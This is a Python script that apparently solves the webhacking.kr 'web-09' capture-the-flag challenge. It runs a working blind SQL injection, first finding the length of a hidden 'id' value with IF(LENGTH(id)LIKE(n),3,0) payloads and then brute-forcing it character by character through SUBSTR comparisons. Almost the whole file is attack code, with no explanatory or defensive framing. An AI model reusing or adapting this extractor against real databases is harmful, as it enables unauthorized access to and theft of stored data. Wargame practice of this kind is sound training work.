import requests


def query(param: str) -> bool:
    url = f"https://webhacking.kr/challenge/web-09/index.php?no={param}"
    response = requests.get(url)
    return "Secret" in response.text


def get_length_param(length: int) -> str:
    return f"IF(LENGTH(id)LIKE({length}),3,0)"


def get_ascii_param(idx: int, ascii_number: int) -> str:
    return f"IF(SUBSTR(id,{idx},1)LIKE({hex(ascii_number)}),3,0)"


if __name__ == '__main__':
    id_length = 1
    while not query(get_length_param(id_length)):
        id_length += 1

    password = ""
    for i in range(1, id_length + 1):
        ascii_num = 65
        while not query(get_ascii_param(i, ascii_num)):
            ascii_num += 1
        password += chr(ascii_num)
    print("Password: " + password.lower())
